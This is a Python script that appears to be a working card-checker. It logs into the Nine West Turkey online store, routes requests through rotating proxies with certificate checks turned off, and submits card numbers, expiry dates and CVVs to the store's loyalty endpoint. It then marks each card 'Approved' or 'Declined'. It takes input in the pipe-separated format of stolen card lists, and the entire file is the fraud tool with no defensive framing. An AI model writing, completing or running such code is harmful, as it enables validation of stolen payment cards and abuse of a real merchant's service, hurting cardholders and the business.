import requests, re, threading, urllib3, json, os, time, random, hashlib
from requests.adapters import HTTPAdapter
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
try:
    import helpers.proxy_manager as proxy_manager
except Exception:
    proxy_manager = None
import config
H = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36", 'Accept-Encoding': "gzip, deflate, br, zstd", 'Content-Type': "application/json", 'sec-ch-ua-platform': "\"Android\"", 'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"", 'sec-ch-ua-mobile': "?1", 'accept-language': "tr,en-US;q=0.9,en;q=0.8,de;q=0.7"}
LU = "https://www.ninewest.com.tr/webservice/v1/login"
LP = {"email": config.LOGIN_EMAIL, "password": config.LOGIN_PASSWORD, "g-recaptcha-response": None, "version": 3, "hash": config.HASH}
LH = {'origin': "https://www.ninewest.com.tr", 'referer': "https://www.ninewest.com.tr/customer/login", 'sec-fetch-site': "same-origin", 'sec-fetch-mode': "cors", 'sec-fetch-dest': "empty", 'web-platform': "nextjs"}
CU = "https://checkout-be.ninewest.com.tr/webservice/v1/retrievecardloyalty"
_cs, _bh, _rc = None, "", 0
_lk = threading.Lock()
RPS = 5
def gas(force=False):
    global _cs, _bh, _rc
    with _lk:
        if not force and _cs is not None and _rc < RPS:
            _rc += 1
            return _cs, _bh
        s = requests.Session()
        a = HTTPAdapter(pool_connections=20, pool_maxsize=20, max_retries=1)
        s.mount("https://", a); s.mount("http://", a)
        s.headers.update(H)
        try:
            s.post(LU, json=LP, headers=LH, timeout=7, verify=False)
            _bh = s.cookies.get('basket_hash', '')
            _cs = s; _rc = 1
        except Exception:
            _bh = ""; _cs = s; _rc = 1
        return _cs, _bh
def ppc(pan, em, ey, cvv, up=True):
    s, bh = gas()
    rs = s
    if up and proxy_manager:
        p = proxy_manager.get_random_proxy("gate_puan", fallback_to_all=True)
        if p:
            rs = requests.Session()
            a = HTTPAdapter(pool_connections=10, pool_maxsize=10, max_retries=1)
            rs.mount("https://", a); rs.mount("http://", a)
            rs.headers.update(H); rs.cookies.update(s.cookies); rs.proxies.update(p)
    fp = " ".join([pan[i:i+4] for i in range(0, len(pan), 4)])
    pl = {"cc_number": fp, "cc_cvv": cvv if cvv else "000", "cc_month": em, "cc_year": ey}
    hh = {'Accept': "application/json, text/plain, */*", 'shoppingcartid': str(bh), 'platform': "MOBILEWEB", 'origin': "https://checkout.ninewest.com.tr", 'referer': "https://checkout.ninewest.com.tr/", 'sec-fetch-site': "same-site", 'sec-fetch-mode': "cors", 'sec-fetch-dest': "empty"}
    return rs.post(CU, json=pl, headers=hh, timeout=7, verify=False).json()
def check_card(cin):
    m = re.search(r'(\d{15,19})[\s|/:-]+(\d{1,2})[\s|/:-]+(\d{2,4})(?:[\s|/:-]+(\d{3,4}))?', cin)
    if m:
        pan, em, eyr = m.group(1), m.group(2).zfill(2), m.group(3)
        ey = eyr[-2:]; eyf = ("20" + ey) if len(eyr) == 2 else eyr
        cvv = m.group(4) if m.group(4) else "000"
    else:
        p = cin.strip().split('|')
        if len(p) < 3: return f"cc: {cin} -> Error (Format Hatalı)"
        pan, em, eyr = p[0].strip().replace(' ', ''), p[1].strip().zfill(2), p[2].strip()
        ey = eyr[-2:]; eyf = ("20" + ey) if len(eyr) == 2 else eyr
        cvv = p[3].strip() if len(p) >= 4 else "000"
    cs = f"{pan}|{em}|{ey}|{cvv}"
    d = None
    try: d = ppc(pan, em, eyf, cvv, True)
    except Exception: pass
    if not d:
        try: d = ppc(pan, em, eyf, cvv, False)
        except Exception:
            try:
                gas(True); d = ppc(pan, em, eyf, cvv, False)
            except Exception as e: return f"cc: {cs} -> Error ({e})"
    try:
        sc = d.get("status", {}).get("code")
        msg = d.get("status", {}).get("message") or d.get("message") or d.get("error") or d.get("errorMessage") or str(d)
        if isinstance(msg, str):
            tr = str.maketrans("çğıöşüÇĞİÖŞÜ", "cgiosuCGIOSU"); msg = msg.translate(tr).strip()
        else: msg = str(msg)
        if sc == 200:
            rw = d.get("data", {}).get("cardRewardMoney", 0.0)
            try: rv = float(rw)
            except: rv = 0.0
            return f"cc: {cs} -> Approved! - ({rw} TRY Puan!)" if rv > 0.0 else f"cc: {cs} -> Declined! - ({msg})"
        return f"cc: {cs} -> Declined! - ({msg})"
    except Exception as e: return f"cc: {cs} -> Error ({e})"
